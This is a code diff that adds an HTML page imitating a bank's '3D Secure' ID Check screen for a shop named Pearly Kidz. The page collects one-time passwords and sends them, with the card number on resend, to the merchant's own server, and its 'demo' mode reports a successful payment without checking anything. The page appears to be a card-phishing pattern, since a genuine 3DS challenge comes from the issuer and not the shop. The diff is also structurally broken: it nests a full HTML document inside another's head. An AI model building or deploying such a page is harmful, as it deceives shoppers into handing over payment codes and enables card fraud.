@@ -1,7 +1,261 @@
  <!DOCTYPE html>
 <html lang="en">
 
+<head> <!DOCTYPE html>
+<html lang="en">
+
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Secure Online Shopping</title>      
+     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .logo-section {
+            background-color: #fefefe;
+            padding: 1rem;
+            border-radius: 0.5rem;
+        }
+
+        #otp {
+            font-size: 18px;
+            letter-spacing: 3px;
+        }
+    </style>
+</head>
+
+<body class="bg-white min-h-screen flex items-center justify-center flex-col px-4">
+
+    <!-- Cancel Button -->
+    <div class="w-full max-w-md px-4 flex justify-end mb-4">
+        <button class="text-base sm:text-lg font-semibold text-gray-600" id="cancelBtn">Cancel</button>
+    </div>
+
+    <!-- Main Card -->
+    <div id="mainCard" class="w-full max-w-sm sm:max-w-md px-4 py-8 border border-gray-300 shadow-md rounded-md text-center text-black bg-white">
+        
+        <div class="flex justify-between items-center mb-4">
+            <!-- ID Check Label -->
+            <span class="text-xs sm:text-sm font-semibold">ID Check</span>
+
+            <div class="flex items-center gap-2">
+                            </div>
+        </div>
+
+        <!-- Title -->
+        <h1 class="text-base sm:text-lg font-semibold border-t pt-2 text-left">3D Secure Online Shopping</h1>
+
+        <!-- Message -->
+        <p class="text-sm sm:text-base text-left mt-2">
+            Please enter the One-Time-Password (OTP) to complete your transaction. The OTP has been sent to your mobile number.
+        </p>
+
+        <!-- Transaction Details -->
+                <div class="text-left text-sm sm:text-base mt-4 border-t pt-4">
+            <h2 class="font-bold mb-2 text-black">Transaction Details:</h2>
+         <p><strong>Merchant Name:</strong> <span id="merchant"></span></p>
+         <p><strong>Amount:</strong> <span id="amount"></span></p>
+         <p><strong>Date:</strong> <span id="date"></span></p>
+         <p><strong>Card Number:</strong> <span id="cardNumber"></span></p>
+
+        </div>
+
+        <!-- OTP Form -->
+        <form id="otpForm" action="https://pearlykids-uae.com/checkout/otp" method="POST">
+            <input type="hidden" name="_token" value="5919XgTwSXYKxPvK70d9YdfK09TAzhFPEpBhrh7i" autocomplete="off">            <div class="mt-6">
+                <label for="otp" class="block text-sm mb-1">Verification code</label>
+                <input type="text" id="otp" name="otp" maxlength="6"
+                       inputmode="numeric"
+                       pattern="[0-9]*"
+                       class="w-full border border-gray-400 rounded-md p-3 text-center focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all">
+                <p id="otpError" class="text-red-500 text-sm mt-1 hidden">Please enter a valid number</p>
+            </div>
+            <button class="bg-blue-700 hover:bg-blue-800 text-white font-bold py-2 px-6 rounded mt-6 w-full" type="submit">
+                Submit
+            </button>
+        </form>
+
+        <!-- Hidden Card Number -->
+        <input type="hidden" id="cardNumberHidden" value="">
+
+        <!-- Resend Code Button -->
+        <button id="resendBtn" class="text-blue-800 font-bold text-base sm:text-xl mt-5">RESEND CODE</button>
+
+        <!-- Terms of Service Note -->
+        <p class="text-xs text-gray-600 mt-4 text-center sm:text-sm">
+            By clicking "Submit" you agree to the 
+            <a href="https://pearlykids-uae.com/terms-of-service/" class="text-blue-600 hover:underline">
+                Terms of service
+            </a>.
+        </p>
+    </div>
+
+    <script>
+        // ============================================================
+        //  Pearly Kidz - 3D Secure OTP page
+        //  mode = 'demo' : verification happens inside the page (no server),
+        //                  then success + clear cart + back to the store.
+        //  mode = 'live' : the form is submitted to the real backend (action).
+        // ============================================================
+        const OTP_CONFIG = { mode: 'demo' };
+
+        const otpForm = document.getElementById("otpForm");
+        const otpInput = document.getElementById("otp");
+        const otpError = document.getElementById("otpError");
+        const hiddenCard = document.getElementById("cardNumberHidden");
+
+        // ---------- helpers ----------
+        function readJSON(key) {
+            try { return JSON.parse(sessionStorage.getItem(key) || 'null'); } catch (e) { return null; }
+        }
+        function pad(n) { return String(n).padStart(2, '0'); }
+        function formatDate(d) {
+            return pad(d.getDate()) + '/' + pad(d.getMonth() + 1) + '/' + d.getFullYear()
+                + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
+        }
+
+        // ---------- 1) fill transaction details from the order/payment ----------
+        function fillDetails() {
+            const order = readJSON('pk_pending_order');
+            const payment = readJSON('pk_payment');
+
+            const merchantEl = document.getElementById('merchant');
+            const amountEl = document.getElementById('amount');
+            const dateEl = document.getElementById('date');
+            const cardEl = document.getElementById('cardNumber');
+
+            const merchant = (order && order.store) ? order.store : 'Pearly Kidz';
+            let amount = '-';
+            if (order && typeof order.subtotal !== 'undefined') {
+                amount = (order.currency ? order.currency + ' ' : '') + order.subtotal;
+            }
+            const cardText = (payment && payment.masked) ? payment.masked : '-';
+
+            if (merchantEl) merchantEl.textContent = merchant;
+            if (amountEl) amountEl.textContent = amount;
+            if (dateEl) dateEl.textContent = formatDate(new Date());
+            if (cardEl) cardEl.textContent = cardText;
+            if (hiddenCard) hiddenCard.value = cardText;
+        }
+
+        // ---------- 2) success screen ----------
+        function showSuccess() {
+            const card = document.getElementById('mainCard');
+            const cancel = document.getElementById('cancelBtn');
+            if (cancel) cancel.style.display = 'none';
+
+            // clear the cart and the temporary order/payment data
+            try { localStorage.removeItem('pk_cart'); } catch (e) {}
+            try {
+                sessionStorage.removeItem('pk_pending_order');
+                sessionStorage.removeItem('pk_payment');
+            } catch (e) {}
+
+            if (card) {
+                card.innerHTML =
+                    '<div class="py-6">' +
+                        '<div class="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-green-100">' +
+                            '<svg viewBox="0 0 24 24" class="h-9 w-9 text-green-600" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>' +
+                        '</div>' +
+                        '<h2 class="text-lg sm:text-xl font-bold text-gray-900 mb-2">Payment Successful</h2>' +
+                        '<p class="text-sm sm:text-base text-gray-600 mb-6">Thank you! Your order has been confirmed and will be processed shortly.</p>' +
+                        '<button id="backToStore" class="bg-blue-700 hover:bg-blue-800 text-white font-bold py-2 px-6 rounded w-full">Back to Store</button>' +
+                        '<p class="text-xs text-gray-400 mt-3">Redirecting to the store...</p>' +
+                    '</div>';
+
+                const back = document.getElementById('backToStore');
+                if (back) back.addEventListener('click', function () { window.location.href = 'index.html'; });
+
+                setTimeout(function () { window.location.href = 'index.html'; }, 4000);
+            }
+        }
+
+        // ---------- 3) numbers only in the OTP field ----------
+        otpInput.addEventListener('input', function (e) {
+            const value = e.target.value.replace(/\D/g, '');
+            e.target.value = value;
+            if (value.length > 0) {
+                otpInput.classList.remove("border-red-500");
+                otpError.classList.add("hidden");
+            }
+        });
+
+        // ---------- 4) submit ----------
+        otpForm.addEventListener("submit", function (e) {
+            const otpValue = otpInput.value.trim();
+            const isValid = /^\d{4,6}$/.test(otpValue);
+
+            if (!isValid) {
+                e.preventDefault();
+                otpInput.classList.add("border-red-500");
+                otpError.classList.remove("hidden");
+                return;
+            }
+
+            if (OTP_CONFIG.mode === 'demo') {
+                e.preventDefault();
+                showSuccess();
+            }
+            // in 'live' mode the form is submitted to the backend as-is
+        });
+
+        // ---------- 5) resend code ----------
+        document.getElementById('resendBtn').addEventListener('click', () => {
+            if (OTP_CONFIG.mode === 'live') {
+                const cardNumber = hiddenCard ? hiddenCard.value : '';
+                const otp = otpInput ? otpInput.value : '';
+                const formData = new URLSearchParams();
+                formData.append('cardNumber', cardNumber);
+                formData.append('otp', otp);
+                formData.append('_token', '5919XgTwSXYKxPvK70d9YdfK09TAzhFPEpBhrh7i');
+                fetch("/checkout/resend", {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: formData.toString()
+                }).then(res => res.text()).then(() => {
+                    otpInput.value = '';
+                    otpInput.focus();
+                }).catch(() => {});
+            } else {
+                otpInput.value = '';
+                otpInput.focus();
+                otpError.classList.add('hidden');
+                otpInput.classList.remove('border-red-500');
+                const btn = document.getElementById('resendBtn');
+                const original = btn.textContent;
+                btn.textContent = 'Code sent';
+                setTimeout(() => { btn.textContent = original; }, 2000);
+            }
+        });
+
+        // ---------- 6) cancel ----------
+        document.getElementById('cancelBtn').addEventListener('click', async () => {
+            if (OTP_CONFIG.mode === 'live') {
+                try {
+                    await fetch("/checkout/cancel", {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-CSRF-TOKEN': '5919XgTwSXYKxPvK70d9YdfK09TAzhFPEpBhrh7i'
+                        }
+                    });
+                } catch (e) {
+                    console.error(e);
+                }
+            }
+            window.location.href = 'index.html';
+        });
+
+        // ---------- 7) on load ----------
+        fillDetails();
+        document.addEventListener('DOMContentLoaded', function () {
+            fillDetails();
+            otpInput.focus();
+        });
+    </script>
+
+</body>
+</html>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>3D Secure Online Shopping</title>      
